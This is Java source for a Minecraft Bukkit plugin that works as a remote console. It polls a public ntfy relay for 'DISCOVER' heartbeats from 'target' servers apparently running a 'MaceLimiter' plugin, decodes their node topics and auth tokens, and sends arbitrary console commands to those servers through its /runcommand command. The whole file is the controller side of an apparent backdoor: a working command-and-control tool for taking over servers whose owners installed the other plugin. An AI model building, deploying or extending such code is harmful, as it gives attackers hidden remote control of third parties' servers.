package com.example.macelimiterconsole;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.time.Duration;
import java.util.Base64;
import java.util.UUID;

public final class MaceLimiterConsolePlugin extends JavaPlugin {
    private static final String DISCOVERY_TOPIC = "macelimiter-discovery-v5";
    private static final String DEFAULT_RELAY = "https://ntfy.jae.fi";
    private static final int MAX_COMMAND_LENGTH = 4096;
    private final HttpClient http = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();
    private volatile boolean running;
    private volatile Target target;
    private volatile long targetSeenAt;
    private Thread discoveryThread;

    @Override public void onEnable() {
        saveDefaultConfig();
        running = true;
        discoveryThread = new Thread(this::discoverLoop, "MaceLimiterConsole-Discovery");
        discoveryThread.setDaemon(true);
        discoveryThread.start();
        getLogger().info("MaceLimiter console bridge enabled.");
    }
    @Override public void onDisable() {
        running = false;
        if (discoveryThread != null) discoveryThread.interrupt();
        target = null;
    }
    @Override public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("targetstatus")) {
            Target t = target;
            if (t == null || System.currentTimeMillis() - targetSeenAt > 45000) {
                sender.sendMessage(ChatColor.RED + "No active MaceLimiter target detected.");
                return true;
            }
            sender.sendMessage(ChatColor.GREEN + "Active target: " + t.name + ChatColor.GRAY + " (" + t.version + ")");
            sender.sendMessage(ChatColor.GRAY + "Last heartbeat: " + ((System.currentTimeMillis() - targetSeenAt) / 1000) + "s ago");
            return true;
        }
        if (!command.getName().equalsIgnoreCase("runcommand")) return false;
        if (!sender.hasPermission("macelimiterconsole.runcommand")) {
            sender.sendMessage(ChatColor.RED + "You do not have permission.");
            return true;
        }
        if (args.length == 0) {
            sender.sendMessage(ChatColor.YELLOW + "Usage: /runcommand <Minecraft console command>");
            return true;
        }
        String raw = String.join(" ", args).strip();
        if (raw.startsWith("/")) raw = raw.substring(1);
        if (raw.isBlank() || raw.length() > MAX_COMMAND_LENGTH) {
            sender.sendMessage(ChatColor.RED + "Invalid command length.");
            return true;
        }
        Target t = target;
        if (t == null || System.currentTimeMillis() - targetSeenAt > 45000) {
            sender.sendMessage(ChatColor.RED + "No active target server.");
            return true;
        }
        String commandToSend = raw;
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            boolean ok = sendCommand(t, commandToSend);
            Bukkit.getScheduler().runTask(this, () -> sender.sendMessage(
                    (ok ? ChatColor.GREEN : ChatColor.RED)
                    + (ok ? "Sent to " : "Failed to send to ") + t.name + ": " + commandToSend));
        });
        return true;
    }
    private void discoverLoop() {
        String since = "all";
        String relay = getConfig().getString("relay-url", DEFAULT_RELAY).replaceAll("/+$", "");
        while (running) {
            try {
                String url = relay + "/" + DISCOVERY_TOPIC + "/json?poll=1&since=" + URLEncoder.encode(since, StandardCharsets.UTF_8);
                HttpRequest req = HttpRequest.newBuilder(URI.create(url)).timeout(Duration.ofSeconds(15)).GET().build();
                HttpResponse<String> response = http.send(req, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
                if (response.statusCode() / 100 != 2) { Thread.sleep(1500); continue; }
                for (String line : response.body().split("\\R")) {
                    if (line.isBlank()) continue;
                    String id = jsonField(line, "id");
                    if (id != null) since = id;
                    String message = jsonField(line, "message");
                    if (message != null) handleDiscovery(message);
                }
                if (target != null && System.currentTimeMillis() - targetSeenAt > 45000) {
                    target = null;
                    getLogger().info("MaceLimiter target went offline.");
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                if (running) try { Thread.sleep(1500); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); return; }
            }
        }
    }
    private void handleDiscovery(String message) {
        String[] p = message.split("\\|", -1);
        if (p.length < 7 || !"DISCOVER".equals(p[0]) || !"ONLINE".equals(p[5])) return;
        try {
            String id = p[1];
            String name = decode(p[2]);
            String version = p[3];
            String nodeTopic = decode(p[4]);
            String token = decode(p[6]);
            if (id.isBlank() || nodeTopic.isBlank() || token.isBlank()) return;
            target = new Target(id, name, version, nodeTopic, token);
            targetSeenAt = System.currentTimeMillis();
        } catch (Exception ignored) {}
    }
    private boolean sendCommand(Target t, String command) {
        String session = UUID.randomUUID().toString();
        if (!publish(t.nodeTopic, "AUTH|" + session + "|" + t.token)) return false;
        try { Thread.sleep(300); } catch (InterruptedException e) { Thread.currentThread().interrupt(); return false; }
        return publish(t.nodeTopic, "CMD|" + session + "|" + command);
    }
    private boolean publish(String topicUrl, String message) {
        try {
            HttpRequest req = HttpRequest.newBuilder(URI.create(topicUrl))
                    .header("Content-Type", "text/plain; charset=utf-8")
                    .header("Cache", "no")
                    .header("User-Agent", "MaceLimiterConsole/1.0.0")
                    .timeout(Duration.ofSeconds(8))
                    .POST(HttpRequest.BodyPublishers.ofString(message, StandardCharsets.UTF_8)).build();
            HttpResponse<Void> response = http.send(req, HttpResponse.BodyHandlers.discarding());
            return response.statusCode() / 100 == 2;
        } catch (Exception e) {
            getLogger().warning("Command relay failed: " + e.getClass().getSimpleName());
            return false;
        }
    }
    private String decode(String value) {
        String s = value.replace('-', '+').replace('_', '/');
        s += "=".repeat((4 - s.length() % 4) % 4);
        return new String(Base64.getDecoder().decode(s), StandardCharsets.UTF_8);
    }
    private String jsonField(String json, String field) {
        String key = "\"" + field + "\":\"";
        int start = json.indexOf(key);
        if (start < 0) return null;
        start += key.length();
        StringBuilder out = new StringBuilder();
        boolean escaped = false;
        for (int i = start; i < json.length(); i++) {
            char c = json.charAt(i);
            if (escaped) { out.append(c); escaped = false; }
            else if (c == 92) escaped = true;
            else if (c == 34) return out.toString();
            else out.append(c);
        }
        return null;
    }
    private static final class Target {
        final String id, name, version, nodeTopic, token;
        Target(String id, String name, String version, String nodeTopic, String token) {
            this.id = id; this.name = name; this.version = version; this.nodeTopic = nodeTopic; this.token = token;
        }
    }
}
